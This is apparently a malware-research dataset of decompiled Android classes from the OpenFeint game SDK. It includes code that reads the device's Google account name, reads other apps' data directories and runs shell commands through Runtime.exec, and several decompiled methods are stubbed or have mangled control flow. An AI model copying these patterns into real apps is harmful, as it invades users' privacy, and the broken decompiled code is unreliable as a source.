ServerException e=new ServerException();       e.exceptionClass=""NoFeint"";       e.message=""OpenFeint has not been initialized."";       req.onResponse(0,e.generate().getBytes());       return;     }     ofi._makeRequest(req);   }   public final void _makeRequest(  final BaseRequest req){     if (!isUserLoggedIn() && req.wantsLogin() && lastLoggedInUser() != null && isFeintServerReachable()) {       login(DEVELOPMENT_LOGGING_ENABLED);       if (this.mQueuedPostLoginRunnables == null) {         this.mQueuedPostLoginRunnables=new ArrayList();       }       this.mQueuedPostLoginRunnables.add(new Runnable(){         @Override public void run(){           OpenFeintInternal.this.mClient.makeRequest(req);         }       } );       return;     }     if (!this.mDeviceSessionCreated && req.needsDeviceSession()) {       createDeviceSession();       if (this.mQueuedPostDeviceSessionRunnables == null) {         this.mQueuedPostDeviceSessionRunnables=new ArrayList();       }       this.mQueuedPostDeviceSessionRunnables.add(new Runnable(){         @Override public void run(){           OpenFeintInternal.this.mClient.makeRequest(req);         }       } );       return;     }     this.mClient.makeRequest(req);   }   public void uploadFile(  String xpApiPath,  String filePath,  String contentType,  IUploadDelegate delegate){     String fileName=filePath;     try {       String[] parts=filePath.split(""/"");       if (parts.length > 0) {         fileName=parts[parts.length - 1];       }       uploadFile(xpApiPath,new FilePartSource(fileName,new File(filePath)),contentType,delegate);     }  catch (    FileNotFoundException e) {       delegate.fileUploadedTo("""",DEVELOPMENT_LOGGING_ENABLED);     }   }   public void uploadFile(  String xpApiPath,  String fileName,  byte[] fileData,  String contentType,  IUploadDelegate delegate){     uploadFile(xpApiPath,new ByteArrayPartSource(fileName,fileData),contentType,delegate);   }   public void uploadFile(  final String xpApiPath,  final PartSource partSource,  final String contentType,  final IUploadDelegate delegate){     JSONRequest xpRequest=new JSONRequest(){       @Override public boolean wantsLogin(){         return true;       }       @Override public String method(){         return ""POST"";       }       @Override public String path(){         return xpApiPath;       }       @Override public void onSuccess(      Object responseBody){         final BlobUploadParameters params=(BlobUploadParameters)responseBody;         BlobPostRequest bp=new BlobPostRequest(params,partSource,contentType);         if (delegate != null) {           final IUploadDelegate iUploadDelegate=delegate;           bp.setDelegate(new IRawRequestDelegate(){             @Override public void onResponse(            int responseCode,            String responseBody2){               iUploadDelegate.fileUploadedTo(String.valueOf(params.action) + params.key,(200 > responseCode || responseCode >= 300) ? OpenFeintInternal.DEVELOPMENT_LOGGING_ENABLED : true);             }           } );         }         OpenFeintInternal.this._makeRequest(bp);       }       @Override public void onFailure(      String reason){         if (delegate != null) {           delegate.fileUploadedTo("""",OpenFeintInternal.DEVELOPMENT_LOGGING_ENABLED);         }       }     } ;     _makeRequest(xpRequest);   }   public int getResource(  String resourceName){     String packageName=getContext().getPackageName();     return getContext().getResources().getIdentifier(resourceName,null,packageName);   }   public static String getRString(  int id){     OpenFeintInternal ofi=getInstance();     Context ctx=ofi.getContext();     return ctx.getResources().getString(id);   }   public static void initializeWithoutLoggingIn(  Context ctx,  OpenFeintSettings settings,  OpenFeintDelegate delegate){     validateManifest(ctx);     if (sInstance == null) {       sInstance=new OpenFeintInternal(settings,ctx);     }     sInstance.mDelegate=delegate;     if (!sInstance.mDeclined) {       String userID=sInstance.getUserID();       if (userID == null) {         OfflineSupport.setUserTemporary();       }  else {         OfflineSupport.setUserID(userID);       }       sInstance.createDeviceSession();       return;     }     OfflineSupport.setUserDeclined();   }   public static void initialize(  Context ctx,  OpenFeintSettings settings,  OpenFeintDelegate delegate){     initializeWithoutLoggingIn(ctx,settings,delegate);     OpenFeintInternal ofi=getInstance();     if (ofi != null) {       ofi.login(DEVELOPMENT_LOGGING_ENABLED);     }   }   public void setDelegate(  OpenFeintDelegate delegate){     this.mDelegate=delegate;   }   private static boolean validateManifest(  android.content.Context r11){     throw new UnsupportedOperationException(""Method not decompiled: com.openfeint.internal.OpenFeintInternal.validateManifest(android.content.Context):boolean"");   }   private OpenFeintInternal(  OpenFeintSettings settings,  Context ctx){     sInstance=this;     this.mContext=ctx;     this.mSettings=settings;     SyncedStore.Reader r=getPrefs().read();     try {       this.mDeclined=r.getString(new StringBuilder(String.valueOf(getContext().getPackageName())).append("".of_declined"").toString(),null) != null ? true : DEVELOPMENT_LOGGING_ENABLED;       r.complete();       this.mMainThreadHandler=new Handler();       this.mInternalProperties=new Properties();       this.mInternalProperties.put(""server-url"",""https://api.openfeint.com"");       this.mInternalProperties.put(""of-version"",""1.9.2"");       loadPropertiesFromXMLResource(this.mInternalProperties,getResource(""@xml/openfeint_internal_settings""));       Log.i(TAG,""Using OpenFeint version "" + this.mInternalProperties.get(""of-version"") + "" (""+ this.mInternalProperties.get(""server-url"")+ "")"");       Properties appProperties=new Properties();       loadPropertiesFromXMLResource(appProperties,getResource(""@xml/openfeint_app_settings""));       this.mSettings.applyOverrides(appProperties);       this.mSettings.verify();       if (!Encryption.initialized()) {         Encryption.init(this.mSettings.secret);       }       this.mClient=new Client(this.mSettings.key,this.mSettings.secret,getPrefs());       Util.moveWebCache(ctx);       WebViewCache.initialize(ctx);       DB.createDB(ctx);       WebViewCache.start();       this.analytics=new Analytics();     }  catch (    Throwable th) {       r.complete();       throw th;     }   }   public Analytics getAnalytics(){     return this.analytics;   }   public String getUserID(){     User user=getCurrentUser();     if (user != null) {       return user.userID();     }     User user2=lastLoggedInUser();     if (user2 != null) {       return user2.userID();     }     return null;   }   public final User lastLoggedInUser(){     User savedUser=loadUser();     SyncedStore.Reader r=getPrefs().read();     try {       URL saved=new URL(getServerUrl());       URL loaded=new URL(r.getString(""last_logged_in_server"",""""));       if (savedUser != null) {         if (saved.equals(loaded)) {           return savedUser;         }       }     }  catch (    MalformedURLException e) {     }  finally {       r.complete();     }     return null;   }   public void login(  final boolean spotlight){     Runnable r=new Runnable(){       @Override public void run(){         if (!OpenFeintInternal.this.mDeclined && !OpenFeintInternal.this.mCurrentlyLoggingIn && !OpenFeintInternal.this.isUserLoggedIn()) {           OpenFeintInternal.this.mDeserializedAlready=true;           final User savedUser=OpenFeintInternal.this.lastLoggedInUser();           if (savedUser != null) {             OpenFeintInternal.log(OpenFeintInternal.TAG,""Logging in last known user: "" + savedUser.name);             OpenFeintInternal openFeintInternal=OpenFeintInternal.this;             final boolean z=spotlight;             openFeintInternal.loginUser(null,null,null,new IRawRequestDelegate(){               @Override public void onResponse(              int responseCode,              String responseBody){                 if (200 > responseCode || responseCode >= 300) {                   if (403 == responseCode) {                     OpenFeintInternal.this.mBanned=true;                     return;                   }  else {                     OpenFeintInternal.this.launchIntroFlow(z);                     return;                   }                 }                 SimpleNotification.show(""Welcome back "" + savedUser.name,Notification.Category.Login,Notification.Type.Success);               }             } );             return;           }           OpenFeintInternal.log(OpenFeintInternal.TAG,""No last user, launch intro flow"");           OpenFeintInternal.this.clearPrefs();           OpenFeintInternal.this.launchIntroFlow(spotlight);         }       }     } ;     this.mMainThreadHandler.post(r);   }   private boolean checkBan(){     if (!this.mBanned) {       return DEVELOPMENT_LOGGING_ENABLED;     }     displayErrorDialog(getContext().getText(R.string.of_banned_dialog));     return true;   }   public void launchIntroFlow(  final boolean spotlight){     if (!checkBan()) {       if (isFeintServerReachable()) {         OpenFeintDelegate d=getDelegate();         if (this.mApproved || d == null || !d.showCustomApprovalFlow(getContext())) {           Runnable r=new Runnable(){             @Override public void run(){               Intent i=new Intent(OpenFeintInternal.this.getContext(),(Class<?>)IntroFlow.class);               if (OpenFeintInternal.this.mApproved && spotlight) {                 i.putExtra(""content_name"",""index?preapproved=true&spotlight=true"");               }  else               if (!spotlight) {                 if (OpenFeintInternal.this.mApproved) {                   i.putExtra(""content_name"",""index?preapproved=true"");                 }               }  else {                 i.putExtra(""content_name"",""index?spotlight=true"");               }               i.addFlags(268435456);               OpenFeintInternal.this.getContext().startActivity(i);             }           } ;           if (this.mCreatingDeviceSession || !this.mDeviceSessionCreated) {             if (!this.mCreatingDeviceSession) {               createDeviceSession();             }             this.mPostDeviceSessionRunnable=r;             return;           }           r.run();           return;         }         return;       }       showOfflineNotification(0,"""");     }   }   public void showOfflineNotification(  int httpCode,  Object responseBody){     Resources r=getContext().getResources();     String serverMessage=r.getString(R.string.of_offline_notification_line2);     if (httpCode != 0) {       if (403 == httpCode) {         this.mBanned=true;       }       if (responseBody instanceof ServerException) {         serverMessage=((ServerException)responseBody).message;       }     }     TwoLineNotification.show(r.getString(R.string.of_offline_notification),serverMessage,Notification.Category.Foreground,Notification.Type.NetworkOffline);     log(""Reachability"",""Unable to launch IntroFlow because: "" + serverMessage);   }   private void loadPropertiesFromXMLResource(  Properties defaults,  int resourceID){     XmlResourceParser xml=null;     try {       xml=getContext().getResources().getXml(resourceID);     }  catch (    Exception e) {     }     if (xml != null) {       String k=null;       try {         int eventType=xml.getEventType();         while (xml.getEventType() != 1) {           if (eventType == 2) {             k=xml.getName();           }  else           if (xml.getEventType() == 4) {             defaults.setProperty(k,xml.getText());           }           xml.next();           eventType=xml.getEventType();         }         xml.close();       }  catch (      Exception e2) {         throw new RuntimeException(e2);       }     }   }   public boolean isFeintServerReachable(){     if (Util.noPermission(""android.permission.ACCESS_NETWORK_STATE"",getContext())) {       return true;     }     ConnectivityManager conMan=(ConnectivityManager)getContext().getSystemService(""connectivity"");     NetworkInfo activeNetwork=conMan.getActiveNetworkInfo();     if (activeNetwork == null || !activeNetwork.isConnected()) {       return DEVELOPMENT_LOGGING_ENABLED;     }     return true;   }   public static void log(  String tag,  String message){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\Reader.code","public class Reader {   public Reader(){   }   public String getString(  String k,  String defValue){     String rv=(String)SyncedStore.this.mMap.get(k);     return rv != null ? rv : defValue;   }   public Set<String> keySet(){     return SyncedStore.this.mMap.keySet();   }   public void complete(){     SyncedStore.this.mLock.readLock().unlock();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\SyncedStore.code","public class SyncedStore {   private static final String FILENAME=""of_prefs"";   private static final String TAG=""DistributedPrefs"";   private Context mContext;   private HashMap<String,String> mMap=new HashMap<>();   private ReentrantReadWriteLock mLock=new ReentrantReadWriteLock(); public class Editor {     public Editor(){     }     public void putString(    String k,    String v){       SyncedStore.this.mMap.put(k,v);     }     public void remove(    String k){       SyncedStore.this.mMap.remove(k);     }     public Set<String> keySet(){       return new HashSet(SyncedStore.this.mMap.keySet());     }     public void commit(){       SyncedStore.this.save();       SyncedStore.this.mLock.writeLock().unlock();     }   }   public Editor edit(){     this.mLock.writeLock().lock();     return new Editor();   } public class Reader {     public Reader(){     }     public String getString(    String k,    String defValue){       String rv=(String)SyncedStore.this.mMap.get(k);       return rv != null ? rv : defValue;     }     public Set<String> keySet(){       return SyncedStore.this.mMap.keySet();     }     public void complete(){       SyncedStore.this.mLock.readLock().unlock();     }   }   public Reader read(){     this.mLock.readLock().lock();     return new Reader();   }   public SyncedStore(  Context c){     this.mContext=c;     load();   }   public void load(){     this.mMap=null;     boolean mustSaveAfterLoad=false;     long start=System.currentTimeMillis();     File myStore=this.mContext.getFileStreamPath(FILENAME);     this.mLock.writeLock().lock();     try {       PackageManager packageManager=this.mContext.getPackageManager();       List<ApplicationInfo> apps=packageManager.getInstalledApplications(0);       ApplicationInfo myInfo=null;       Iterator<ApplicationInfo> it=apps.iterator();       while (true) {         if (!it.hasNext()) {           break;         }         ApplicationInfo ai=it.next();         if (ai.packageName.equals(this.mContext.getPackageName())) {           myInfo=ai;           break;         }       }       String myStoreCPath=myStore.getCanonicalPath();       if (myInfo != null && myStoreCPath.startsWith(myInfo.dataDir)) {         String underDataDir=myStoreCPath.substring(myInfo.dataDir.length());         Iterator<ApplicationInfo> it2=apps.iterator();         while (it2.hasNext()) {           File otherStore=new File(it2.next().dataDir,underDataDir);           if (myStore.lastModified() < otherStore.lastModified()) {             mustSaveAfterLoad=true;             myStore=otherStore;           }         }         this.mMap=mapFromStore(myStore);       }       if (this.mMap == null) {         this.mMap=new HashMap<>();       }     }  catch (    IOException e) {       OpenFeintInternal.log(TAG,""broken"");     }  finally {       this.mLock.writeLock().unlock();     }     if (mustSaveAfterLoad) {       save();     }     long elapsed=System.currentTimeMillis() - start;     OpenFeintInternal.log(TAG,""Loading prefs took "" + new Long(elapsed).toString() + "" millis"");   }   private HashMap<String,String> mapFromStore(  File myStore){     InputStream is;     ObjectInputStream ois;     Object o;     InputStream is2=null;     ObjectInputStream ois2=null;     try {       try {         is=new FileInputStream(myStore);         try {           ois=new ObjectInputStream(is);           try {             o=ois.readObject();           }  catch (          FileNotFoundException e) {             ois2=ois;             is2=is;             OpenFeintInternal.log(TAG,""Couldn't open of_prefs"");             try {             }  catch (            IOException e2) {               OpenFeintInternal.log(TAG,""IOException while cleaning up"");             }             if (ois2 == null) {               if (is2 != null) {                 is2.close();               }               return null;             }             ois2.close();             return null;           } catch (          StreamCorruptedException e3) {             ois2=ois;             is2=is;             OpenFeintInternal.log(TAG,""StreamCorruptedException"");             try {             }  catch (            IOException e4) {               OpenFeintInternal.log(TAG,""IOException while cleaning up"");             }             if (ois2 == null) {               if (is2 != null) {                 is2.close();               }               return null;             }             ois2.close();             return null;           } catch (          IOException e5) {             ois2=ois;             is2=is;             OpenFeintInternal.log(TAG,""IOException while reading"");             try {             }  catch (            IOException e6) {               OpenFeintInternal.log(TAG,""IOException while cleaning up"");             }             if (ois2 == null) {               if (is2 != null) {                 is2.close();               }               return null;             }             ois2.close();             return null;           } catch (          ClassNotFoundException e7) {             ois2=ois;             is2=is;             OpenFeintInternal.log(TAG,""ClassNotFoundException"");             try {             }  catch (            IOException e8) {               OpenFeintInternal.log(TAG,""IOException while cleaning up"");             }             if (ois2 == null) {               if (is2 != null) {                 is2.close();               }               return null;             }             ois2.close();             return null;           } catch (          Throwable th) {             th=th;             ois2=ois;             is2=is;             try {             }  catch (            IOException e9) {               OpenFeintInternal.log(TAG,""IOException while cleaning up"");             }             if (ois2 == null) {               if (is2 != null) {                 is2.close();               }               throw th;             }             ois2.close();             throw th;           }         }  catch (        FileNotFoundException e10) {           is2=is;         } catch (        StreamCorruptedException e11) {           is2=is;         } catch (        IOException e12) {           is2=is;         } catch (        ClassNotFoundException e13) {           is2=is;         } catch (        Throwable th2) {           th=th2;           is2=is;         }       }  catch (      Throwable th3) {         th=th3;       }     }  catch (    FileNotFoundException e14) {     } catch (    StreamCorruptedException e15) {     } catch (    IOException e16) {     } catch (    ClassNotFoundException e17) {     }     if (o != null && (o instanceof HashMap)) {       HashMap<String,String> hashMap=(HashMap)o;       try {       }  catch (      IOException e18) {         OpenFeintInternal.log(TAG,""IOException while cleaning up"");       }       if (ois == null) {         if (is != null) {           is.close();         }         return hashMap;       }       ois.close();       return hashMap;     }     try {     }  catch (    IOException e19) {       OpenFeintInternal.log(TAG,""IOException while cleaning up"");     }     if (ois == null) {       if (is != null) {         is.close();         ois2=ois;         is2=is;       }       ois2=ois;       is2=is;       return null;     }     ois.close();     ois2=ois;     is2=is;     return null;   }   public void save(){     ObjectOutputStream oos;     OutputStream os=null;     ObjectOutputStream oos2=null;     this.mLock.readLock().lock();     try {       try {         os=this.mContext.openFileOutput(FILENAME,1);         oos=new ObjectOutputStream(os);       }  catch (      Throwable th) {         th=th;       }     }  catch (    IOException e) {     }     try {       oos.writeObject(this.mMap);       try {         try {         }  catch (        IOException e2) {           OpenFeintInternal.log(TAG,""IOException while cleaning up"");           this.mLock.readLock().unlock();           oos2=oos;         }       }   finally {       }     }  catch (    IOException e3) {       oos2=oos;       OpenFeintInternal.log(TAG,""Couldn't open of_prefs for writing"");       try {       }  catch (      IOException e4) {         OpenFeintInternal.log(TAG,""IOException while cleaning up"");       }  finally {       }       if (oos2 == null) {         if (os != null) {           os.close();         }       }       oos2.close();     } catch (    Throwable th2) {       th=th2;       oos2=oos;       try {       }  catch (      IOException e5) {         OpenFeintInternal.log(TAG,""IOException while cleaning up"");       }  finally {       }       if (oos2 == null) {         if (os != null) {           os.close();         }         throw th;       }       oos2.close();       throw th;     }     if (oos == null) {       if (os != null) {         os.close();       }       this.mLock.readLock().unlock();       oos2=oos;     }     oos.close();     this.mLock.readLock().unlock();     oos2=oos;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\Util.code","public class Util {   private static final String TAG=""Util"";   public static final int VERSION=Integer.valueOf(Build.VERSION.SDK).intValue();   public static boolean isPadVersion(){     return VERSION >= 11;   }   public static void setOrientation(  Activity act){     Integer orientation=(Integer)OpenFeintInternal.getInstance().getSettings().get(OpenFeintSettings.RequestedOrientation);     if (orientation != null) {       act.setRequestedOrientation(orientation.intValue());     }   }   public static final byte[] toByteArray(  InputStream is) throws IOException {     byte[] readBuffer=new byte[4096];     ByteArrayOutputStream accumulator=new ByteArrayOutputStream();     while (true) {       int count=is.read(readBuffer);       if (count > 0) {         accumulator.write(readBuffer,0,count);       }  else {         accumulator.close();         return accumulator.toByteArray();       }     }   }   public static void deleteFiles(  File path){     if (path.isDirectory()) {       String[] files=path.list();       for (      String name : files) {         File child=new File(path,name);         deleteFiles(child);       }     }     path.delete();   }   public static void copyDirectory(  File srcDir,  File dstDir) throws IOException {     if (srcDir.isDirectory()) {       if (!dstDir.exists()) {         dstDir.mkdir();       }       String[] children=srcDir.list();       for (int i=0; i < children.length; i++) {         copyDirectory(new File(srcDir,children[i]),new File(dstDir,children[i]));       }       return;     }     copyFile(srcDir,dstDir);   }   public static void copyFile(  File src,  File dst) throws IOException {     InputStream in=new FileInputStream(src);     OutputStream out=new FileOutputStream(dst);     copyStream(in,out);   }   public static void copyStreamAndLeaveInputOpen(  InputStream in,  OutputStream out) throws IOException {     byte[] copyBuffer=new byte[16384];     while (true) {       int len=in.read(copyBuffer);       if (len > 0) {         out.write(copyBuffer,0,len);       }  else {         out.close();         return;       }     }   }   public static void copyStream(  InputStream in,  OutputStream out) throws IOException {     copyStreamAndLeaveInputOpen(in,out);     in.close();   }   public static void saveFile(  byte[] in,  String path) throws IOException {     File file=new File(path);     file.getParentFile().mkdirs();     FileOutputStream out=new FileOutputStream(file);     out.write(in);     out.close();   }   public static void saveStreamAndLeaveInputOpen(  InputStream in,  String path) throws IOException {     File file=new File(path);     file.getParentFile().mkdirs();     FileOutputStream out=new FileOutputStream(file);     copyStreamAndLeaveInputOpen(in,out);   }   public static void saveStream(  InputStream in,  String path) throws IOException {     saveStreamAndLeaveInputOpen(in,path);     in.close();   }   public static DisplayMetrics getDisplayMetrics(){     DisplayMetrics metrics=new DisplayMetrics();     WindowManager wm=(WindowManager)OpenFeintInternal.getInstance().getContext().getSystemService(""window"");     wm.getDefaultDisplay().getMetrics(metrics);     return metrics;   }   public static void run(  String cmd){     try {       Runtime.getRuntime().exec(cmd);       OpenFeintInternal.log(TAG,cmd);     }  catch (    Exception e) {       OpenFeintInternal.log(TAG,e.getMessage());     }   }   public static void createSymbolic(  String dst,  String src){     run(""ln -s "" + dst + "" ""+ src);   }   public static boolean isSymblic(  File f){     try {       return !f.getCanonicalPath().equals(f.getAbsolutePath());     }  catch (    IOException e) {       return false;     }   }   public static boolean sdcardReady(  Context ctx){     if (!noSdcardPermission(ctx)) {       return false;     }     String state=Environment.getExternalStorageState();     return ""mounted"".equals(state);   }   public static void moveWebCache(  Context ctx){     if (noSdcardPermission(ctx)) {       File cache=new File(ctx.getCacheDir(),""webviewCache"");       if (!isSymblic(cache)) {         String state=Environment.getExternalStorageState();         if (""mounted"".equals(state)) {           File sdcard=new File(Environment.getExternalStorageDirectory(),""openfeint/cache"");           if (!sdcard.exists()) {             sdcard.mkdirs();           }           deleteFiles(cache);           createSymbolic(sdcard.getAbsolutePath(),cache.getAbsolutePath());         }       }     }   }   public static boolean noPermission(  String permission,  Context ctx){     return -1 == ctx.getPackageManager().checkPermission(permission,ctx.getPackageName());   }   public static boolean noSdcardPermission(){     return noSdcardPermission(OpenFeintInternal.getInstance().getContext());   }   public static boolean noSdcardPermission(  Context ctx){     return noPermission(""android.permission.WRITE_EXTERNAL_STORAGE"",ctx);   }   public static byte[] readWholeFile(  String path) throws IOException {     File f=new File(path);     int len=(int)f.length();     InputStream in=new FileInputStream(f);     byte[] b=new byte[len];     in.read(b);     in.close();     return b;   }   public static Object getObjFromJsonFile(  String path){     try {       InputStream in=new FileInputStream(new File(path));       return getObjFromJsonStream(in);     }  catch (    Exception e) {       return null;     }   }   public static Object getObjFromJsonStream(  InputStream in) throws JsonParseException, IOException {     JsonFactory jsonFactory=new JsonFactory();     JsonParser jp=jsonFactory.createJsonParser(in);     JsonResourceParser jrp=new JsonResourceParser(jp);     Object obj=jrp.parse();     in.close();     return obj;   }   public static Object getObjFromJson(  byte[] json){     JsonFactory jsonFactory=new JsonFactory();     try {       JsonParser jp=jsonFactory.createJsonParser(json);       JsonResourceParser jrp=new JsonResourceParser(jp);       return jrp.parse();     }  catch (    Exception e) {       OpenFeintInternal.log(TAG,e.getMessage());       return null;     }   }   public static Object getObjFromJson(  byte[] json,  ResourceClass resourceClass){     JsonFactory jsonFactory=new JsonFactory();     OpenFeintInternal.log(TAG,new String(json));     try {       JsonParser jp=jsonFactory.createJsonParser(json);       JsonResourceParser jrp=new JsonResourceParser(jp);       return jrp.parse(resourceClass);     }  catch (    Exception e) {       OpenFeintInternal.log(TAG,String.valueOf(e.getMessage()) + ""json error"");       return null;     }   }   public static String getDpiName(  Context ctx){     DisplayMetrics metrics=new DisplayMetrics();     WindowManager winMan=(WindowManager)ctx.getSystemService(""window"");     winMan.getDefaultDisplay().getMetrics(metrics);     if (metrics.density >= 2.0f) {       return ""udpi"";     }     if (metrics.density >= 1.5d) {       return ""hdpi"";     }     return ""mdpi"";   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\Util11.code","public class Util11 {   public static boolean isPad(  Context ctx){     try {       Field f=Configuration.class.getField(""SCREENLAYOUT_SIZE_XLARGE"");       int mask=f.getInt(null);       return (ctx.getResources().getConfiguration().screenLayout & mask) == mask;     }  catch (    Exception e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\Util5.code","public class Util5 {   public static String getAccountNameEclair(  Context ctx){     try {       Class<?> cAccountManager=Class.forName(""android.accounts.AccountManager"");       Method get=cAccountManager.getMethod(""get"",Context.class);       Object accountManager=get.invoke(cAccountManager,ctx);       Method getAccountsByType=cAccountManager.getMethod(""getAccountsByType"",String.class);       Object[] accounts=(Object[])getAccountsByType.invoke(accountManager,""com.google"");       Class<?> cAccount=Class.forName(""android.accounts.Account"");       return (String)cAccount.getField(""name"").get(accounts[0]);     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.db\DataStorageHelper.code","public static class DataStorageHelper extends SQLiteOpenHelper {   DataStorageHelper(  Context context){     super(context,DB.DBNAME,(SQLiteDatabase.CursorFactory)null,3);   }   @Override public void onCreate(  SQLiteDatabase db){     DB.onCreate(db);   }   @Override public void onUpgrade(  SQLiteDatabase db,  int oldVersion,  int newVersion){     DB.onUpgrade(db,oldVersion,newVersion);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.db\DataStorageHelperX.code","public static class DataStorageHelperX extends SQLiteOpenHelperX {   DataStorageHelperX(  Context context){     super(new DataStorageHelper(context));   }   DataStorageHelperX(  String path){     super(path,3);   }   @Override public void onCreate(  SQLiteDatabase db){     DB.onCreate(db);   }   @Override public void onUpgrade(  SQLiteDatabase db,  int oldVersion,  int newVersion){     DB.onUpgrade(db,oldVersion,newVersion);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.db\DB.code","public class DB {   public static final String DBNAME=""manifest.db"";   private static final String DBPATH=""/openfeint/webui/manifest.db"";   private static final String TAG=""SQL"";   private static final int VERSION=3;   public static DataStorageHelperX storeHelper;   private static boolean removeDB(  Context ctx){     if (Util.noSdcardPermission()) {       return ctx.getDatabasePath(DBNAME).delete();     }     String state=Environment.getExternalStorageState();     if (""mounted"".equals(state)) {       File sdcard=Environment.getExternalStorageDirectory();       File db=new File(sdcard,DBPATH);       return db.delete();     }     return ctx.getDatabasePath(DBNAME).delete();   }   public static void createDB(  Context ctx){     if (Util.noSdcardPermission()) {       storeHelper=new DataStorageHelperX(ctx);       return;     }     String state=Environment.getExternalStorageState();     if (""mounted"".equals(state)) {       File sdcard=Environment.getExternalStorageDirectory();       storeHelper=new DataStorageHelperX(String.valueOf(sdcard.getAbsolutePath()) + DBPATH);     }  else {       storeHelper=new DataStorageHelperX(ctx);     }   }   public static boolean recover(  Context ctx){     if (storeHelper != null) {       storeHelper.close();     }     boolean success=removeDB(ctx);     if (success) {       createDB(ctx);       return storeHelper != null;     }     return success;   }   public static void setClientManifestBatch(  String[] paths,  String[] clientHashes){     SQLiteDatabase db=null;     try {       if (paths.length == clientHashes.length) {         try {           try {             db=storeHelper.getWritableDatabase();             SQLiteStatement statement=db.compileStatement(""INSERT OR REPLACE INTO manifest(path, hash) VALUES(?,?)"");             db.beginTransaction();             for (int i=0; i < paths.length; i++) {               statement.bindString(1,paths[i]);               statement.bindString(2,clientHashes[i]);               statement.execute();             }             statement.close();             db.setTransactionSuccessful();           }  catch (          Exception e) {             OpenFeintInternal.log(TAG,e.toString());             try {               db.endTransaction();             }  catch (            Exception e2) {             }           }         }  catch (        SQLiteDiskIOException e3) {           WebViewCache.diskError();           try {             db.endTransaction();           }  catch (          Exception e4) {           }         }       }     }   finally {       try {         db.endTransaction();       }  catch (      Exception e5) {       }     }   }   public static void setClientManifest(  String path,  String clientHash){     try {       SQLiteDatabase db=storeHelper.getWritableDatabase();       db.execSQL(""INSERT OR REPLACE INTO manifest(path, hash) VALUES(?,?)"",new String[]{path,clientHash});     }  catch (    SQLiteDiskIOException e) {       WebViewCache.diskError();     } catch (    Exception e2) {       OpenFeintInternal.log(TAG,e2.toString());     }   }   public static void onCreate(  SQLiteDatabase db){     onUpgrade(db,0,3);   }   public static void onUpgrade(  SQLiteDatabase db,  int oldVersion,  int newVersion){     if (oldVersion == 0) {       db.execSQL(""CREATE TABLE IF NOT EXISTS manifest (path TEXT PRIMARY KEY, hash TEXT);"");       oldVersion++;     }     if (oldVersion == 1) {       db.execSQL(""CREATE TABLE IF NOT EXISTS store (ID TEXT PRIMARY KEY, VALUE TEXT);"");       oldVersion++;     }     if (oldVersion == 2) {       db.execSQL(""CREATE TABLE IF NOT EXISTS server_manifest (path TEXT PRIMARY KEY NOT NULL, hash TEXT DEFAULT NULL, is_global INTEGER DEFAULT 0);"");       db.execSQL(""CREATE TABLE IF NOT EXISTS dependencies (path TEXT NOT NULL, has_dependency TEXT NOT NULL);"");       oldVersion++;     }     if (oldVersion != newVersion) {       OpenFeintInternal.log(TAG,String.format(""Unable to upgrade DB from %d to %d."",Integer.valueOf(oldVersion),Integer.valueOf(newVersion)));     }   } public static class DataStorageHelperX extends SQLiteOpenHelperX {     DataStorageHelperX(    Context context){       super(new DataStorageHelper(context));     }     DataStorageHelperX(    String path){       super(path,3);     }     @Override public void onCreate(    SQLiteDatabase db){       DB.onCreate(db);     }     @Override public void onUpgrade(    SQLiteDatabase db,    int oldVersion,    int newVersion){       DB.onUpgrade(db,oldVersion,newVersion);     }   } public static class DataStorageHelper extends SQLiteOpenHelper {     DataStorageHelper(    Context context){       super(context,DB.DBNAME,(SQLiteDatabase.CursorFactory)null,3);     }     @Override public void onCreate(    SQLiteDatabase db){       DB.onCreate(db);     }     @Override public void onUpgrade(    SQLiteDatabase db,    int oldVersion,    int newVersion){       DB.onUpgrade(db,oldVersion,newVersion);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.db\SQLiteOpenHelperX.code","public abstract class SQLiteOpenHelperX {   private static final String TAG=SQLiteOpenHelperX.class.getSimpleName();   private SQLiteDatabase mDatabase=null;   private SQLiteOpenHelper mHelper;   private String mName;   private int mNewVersion;   public abstract void onCreate(  SQLiteDatabase sQLiteDatabase);   public abstract void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2);   public SQLiteOpenHelperX(  String path,  int version){     if (version < 1) {       throw new IllegalArgumentException(""Version must be >= 1, was "" + version);     }     this.mName=path;     this.mNewVersion=version;   }   public SQLiteOpenHelperX(  SQLiteOpenHelper helper){     this.mHelper=helper;   }   public void setSQLiteOpenHelper(  String path,  int version){     if (version < 1) {       throw new IllegalArgumentException(""Version must be >= 1, was "" + version);     }     this.mName=path;     this.mNewVersion=version;     close();   }   public void setSQLiteOpenHelper(  SQLiteOpenHelper helper){     this.mHelper=helper;     close();   }   public synchronized SQLiteDatabase getWritableDatabase(){     SQLiteDatabase sQLiteDatabase;     if (this.mHelper != null) {       sQLiteDatabase=this.mHelper.getWritableDatabase();     }  else     if (this.mDatabase != null && this.mDatabase.isOpen() && !this.mDatabase.isReadOnly()) {       sQLiteDatabase=this.mDatabase;     }  else {       SQLiteDatabase db=null;       try {         db=SQLiteDatabase.openOrCreateDatabase(this.mName,(SQLiteDatabase.CursorFactory)null);         int version=db.getVersion();         if (version != this.mNewVersion) {           db.beginTransaction();           try {             if (version == 0) {               onCreate(db);             }  else {               onUpgrade(db,version,this.mNewVersion);             }             